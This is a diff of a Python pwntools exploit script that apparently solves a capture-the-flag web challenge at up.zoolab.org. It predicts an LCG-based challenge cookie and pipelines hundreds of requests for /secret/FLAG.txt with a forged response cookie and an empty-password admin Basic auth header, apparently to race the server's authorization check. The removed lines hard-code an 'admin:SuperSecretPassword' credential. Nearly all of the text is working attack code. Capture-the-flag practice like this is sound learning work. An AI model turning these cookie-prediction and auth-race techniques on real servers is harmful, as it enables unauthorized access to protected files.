@@ -1,45 +1,94 @@
 #!/usr/bin/env python3
-from pwn import *
-import base64, re
+from pwn import remote, re, context
+import time
 
-HOST = 'up.zoolab.org'
-PORT = 10933
+context.log_level = "warn"
 
-def calc_response(seed):
-    return ((seed * 6364136223846793005) + 1) >> 33
+HOST, PORT = "up.zoolab.org", 10933
 
-def main():
-    # ── 1st request ──────────────────────────────────────────
-    io = remote(HOST, PORT)
-    io.send(b"GET / HTTP/1.1\r\nHost: up\r\n\r\n")
-    head = io.recvuntil(b"\r\n\r\n").decode()
-    io.close()
+LCG_A = 6364136223846793005
+LCG_C = 1
+LCG_SHIFT = 33
 
-    # 取 challenge cookie
-    m = re.search(r"Set-Cookie: challenge=(\d+)", head)
+def lcg_next(seed):
+    return ((seed * LCG_A + LCG_C) & ((1 << 64) - 1)) >> LCG_SHIFT
+
+def fetch_seed_and_expected_cookie(conn):
+    request = (
+        b"GET /secret/FLAG.txt HTTP/1.1\r\n"
+        b"Host: up\r\n\r\n"
+    )
+    conn.send(request)
+
+    response = conn.recvuntil(b"\r\n\r\n", timeout=3)
+    content_len = re.search(rb"Content-Length: (\d+)", response)
+    if content_len:
+        length = int(content_len.group(1))
+        if length > 0:
+            response += conn.recv(length, timeout=3)
+
+    m = re.search(rb"Set-Cookie: challenge=(\d+);", response)
     if not m:
-        log.error("challenge cookie not found")
+        return None
     seed = int(m.group(1))
-    log.info(f"reqseed = {seed}")
+    return lcg_next(seed)
 
-    # 計算 response
-    resp = calc_response(seed)
-    log.info(f"response = {resp}")
+def send_requests(conn, cookie_value, rounds=200):
+    auth = b"Authorization: Basic YWRtaW46\r\n"
+    req_template = (
+        b"GET /secret/FLAG.txt HTTP/1.1\r\n"
+        b"Host: up\r\n"
+        b"Cookie: response=%d\r\n" % cookie_value
+    ) + auth + b"\r\n"
 
-    # Authorization header（admin:SuperSecretPassword）
-    auth = base64.b64encode(b"admin:SuperSecretPassword").decode()
+    filler = b"GET /index.html HTTP/1.1\r\nHost: up\r\n\r\n"
 
-    # ── 2nd request ──────────────────────────────────────────
-    io = remote(HOST, PORT)
-    payload  = b"GET /secret/FLAG.txt HTTP/1.1\r\n"
-    payload += b"Host: up\r\n"
-    payload += f"Cookie: response={resp}\r\n".encode()
-    payload += f"Authorization: Basic {auth}\r\n".encode()
-    payload += b"\r\n"
-    io.send(payload)
+    for _ in range(rounds):
+        conn.send(filler)
+        conn.send(req_template)
 
-    # 印出整個回應
-    print(io.recvall().decode())
+def collect_flag(conn, expected_responses):
+    for _ in range(expected_responses):
+        try:
+            header = conn.recvuntil(b"\r\n\r\n", timeout=2)
+            match = re.search(rb"Content-Length: (\d+)", header)
+            if not match:
+                continue
+            length = int(match.group(1))
+            body = conn.recv(length, timeout=2) if length > 0 else b""
+
+            combined = header + body
+            flag = re.search(rb"FLAG\{[^ \r\n\}]+\}", combined)
+            if flag:
+                return flag.group(0).decode()
+        except:
+            continue
+    return None
+
+def run_once():
+    try:
+        conn = remote(HOST, PORT, timeout=5)
+        cookie = fetch_seed_and_expected_cookie(conn)
+        if cookie is None:
+            conn.close()
+            return None
+
+        send_requests(conn, cookie)
+        flag = collect_flag(conn, 400)
+        conn.close()
+        return flag
+    except:
+        return None
 
 if __name__ == "__main__":
-    main()
+    for attempt in range(3):
+        print(f"Attempt {attempt+1}...")
+        flag = run_once()
+        if flag:
+            print(f"\n[+] Flag obtained: {flag}")
+            break
+        else:
+            print("[-] No flag this time.")
+            time.sleep(1)
+    else:
+        print("[-] All attempts failed.")
